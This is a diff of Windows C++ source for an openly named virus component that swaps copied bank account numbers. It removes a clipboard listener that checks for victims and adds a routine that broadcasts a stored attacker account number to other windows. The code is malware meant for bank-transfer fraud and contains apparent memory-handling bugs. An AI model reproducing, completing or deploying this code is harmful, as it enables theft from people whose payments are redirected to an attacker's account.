@@ -3,9 +3,9 @@
 constexpr char szClassName[] = "KomunikatorWirusa";
 constexpr char windowTitle[] = "Komunikator Wirusa";
 constexpr char msgName[] = "Nic podejrzanego";
+LPSTR bankAccount;
 HWND hwndThis;
 UINT messageCode;
-LPSTR bankAccount;
 bool bAset;
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
@@ -74,7 +74,10 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 	{
 		switch (wParam)
 		{
-		case 1:
+		case REQUEST_NUMBER:
+			if (!bAset) break; // Brak konta bankowego do nadpisania
+			postNumber();
+			//PostMessage(HWND_BROADCAST, messageCode, POST_NUMBER, (LPARAM)bankAccount); 
 			memcpy(bankAccount, &lParam, 17);
 			bAset = true;
 			break;
@@ -82,31 +85,26 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 	}
 	switch (msg)
 	{
-	case WM_CREATE:
-		hwndNextViewer = SetClipboardViewer(hwnd);
-		break;
-	case WM_CLIPBOARDUPDATE:
-		checkForVictim();
-		if (hwndNextViewer != NULL)
-			SendMessage(hwndNextViewer, msg, wParam, lParam);
-		break;
-	case WM_CHANGECBCHAIN:
-		if ((HWND)wParam == hwndNextViewer)
-			hwndNextViewer = HWND(lParam);
-		else
-			if (hwndNextViewer != NULL)
-				SendMessage(hwndNextViewer, msg, wParam, lParam);
-		break;
 	case WM_CLOSE:
 		DestroyWindow(hwnd);
 		break;
 	case WM_DESTROY:
-		ChangeClipboardChain(hwnd, hwndNextViewer);
-		RemoveClipboardFormatListener(hwnd);
 		PostQuitMessage(0);
 		break;
 	default:
 		return DefWindowProc(hwnd, msg, wParam, lParam);
 	}
 	return 0;
+}
+
+void postNumber()
+{
+	HGLOBAL hGlobalMem = GlobalAlloc(GHND, sizeof(bankAccount));
+	if (hGlobalMem != NULL)
+	{
+		LPSTR lpGlobalMem = LPSTR(GlobalLock(hGlobalMem));
+		memcpy(lpGlobalMem, bankAccount, MAXL + 1);
+		GlobalUnlock(hGlobalMem);
+		PostMessage(HWND_BROADCAST, messageCode, POST_NUMBER, LPARAM(hGlobalMem));
+	}
 }
